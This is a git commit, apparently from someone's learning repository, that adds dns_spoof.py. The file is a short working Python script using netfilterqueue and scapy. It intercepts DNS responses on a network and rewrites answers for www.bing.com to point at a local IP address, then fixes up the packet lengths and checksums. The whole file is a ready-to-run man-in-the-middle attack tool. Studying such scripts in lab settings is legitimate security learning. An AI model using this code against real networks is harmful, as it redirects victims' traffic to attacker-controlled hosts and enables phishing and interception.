d8b3d1a24bbe6d6d33dd9eb09545e89f653c7e13
Maryam <maryamibadulla@yahoo.com>
2022-09-06 12:11:12 -0500

    Initial commit

---
+++ dns_spoof.py
@@ -0,0 +1,25 @@
+import netfilterqueue
+import scapy.all as scapy
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.DNSRR): #checking if packet contains a response
+        qname = scapy_packet[scapy.DNSQR].qname #if question is looking for for our web site
+        if "www.bing.com" in qname:
+            print("[+] Spoofing target")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.188.129")
+            scapy_packet[scapy.DNS].an = answer #modify answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+
+            packet.set_payload(str(scapy_packet))
+
+    packet.accept()
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
